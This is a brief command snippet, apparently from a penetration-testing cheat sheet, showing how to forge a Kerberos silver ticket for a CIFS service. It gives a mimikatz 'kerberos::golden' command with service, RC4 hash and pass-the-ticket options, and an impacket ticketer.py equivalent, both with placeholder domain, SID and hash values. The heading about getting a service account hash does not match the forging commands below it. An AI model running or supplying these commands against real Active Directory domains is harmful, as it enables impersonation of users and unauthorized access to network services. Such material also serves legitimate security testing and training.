# Get service account hash (e.g., for CIFS service)
mimikatz "kerberos::golden /domain:domain.local /sid:S-1-5-21-... /target:TARGET.domain.local /service:cifs /rc4:SERVICE_HASH /user:user /ptt"

# Or with impacket
ticketer.py -nthash SERVICE_HASH -domain-sid SID -domain domain.local -spn cifs/TARGET.domain.local user